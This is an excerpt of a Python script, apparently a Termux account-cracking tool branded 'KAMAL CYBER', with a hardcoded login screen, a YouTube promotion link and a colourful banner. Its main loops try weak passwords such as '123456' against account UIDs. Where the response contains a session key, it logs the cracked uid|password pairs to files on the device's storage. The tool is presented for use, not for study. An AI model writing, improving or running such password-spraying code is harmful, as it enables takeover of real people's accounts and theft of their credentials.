...
# ==========================================
# 🔐 LOGIN SYSTEM (RAJA VAU BOX DESIGN) 🔐
# ==========================================
def login_system():
    os.system('clear' if 'termux' in sys.prefix or 'linux' in sys.platform else 'cls')
    print("\033[1;36m")
    print("    ╔══════════════════════════════════════╗")
    print("    ║                                      ║")
    print("    ║             \033[1;33mRAJA VAU\033[1;36m                 ║")
    print("    ║                                      ║")
    print("    ╚══════════════════════════════════════╝")
    print("\033[0m")
    
    username = input("    [\033[1;32m?\033[0m] USERNAME : ")
    password = input("    [\033[1;32m?\033[0m] PASSWORD : ")
    
    if username == "kamal raja" and password == "5m":
        print("\n    [\033[1;32m✓\033[0m] LOGIN SUCCESSFUL! WELCOME...")
        time.sleep(2)
    else:
        print("\n    [\033[1;31m×\033[0m] INCORRECT USERNAME OR PASSWORD!")
        time.sleep(2)
        login_system()

# Run Login System Before Anything Else
login_system()
...
yt_link = "https://youtube.com/@reality-voice_king_kamal?si=IxVqBxihmfSi8gFj"
...
# ==========================================
# 👑 BANGLADESH FLAG PREMIUM BANNER 👑
# ==========================================
def show_branding():
    ...
    # Color Codes for Flag
    G = '\033[32m'   # Green
    R = '\033[31m'   # Red
    W = '\033[1;97m' # Bold White Text
    D = '\033[0m'    # Reset
    B = '\033[1;34m' # Blue
...
""")
    print(f"{B}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;32mOWNER      \x1b[38;5;46m▶  \033[1;36m𝐊𝐀𝐌𝐀𝐋")
    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;35mTOOL       \x1b[38;5;46m▶  \033[1;34m𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐅𝐑𝐄𝐄")
    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;36m	    🔥 𝐊𝐀𝐌𝐀𝐋 𝐂𝐘𝐁𝐄𝐑 🔥")
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/KAMAL-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKAMAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/KAMAL-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
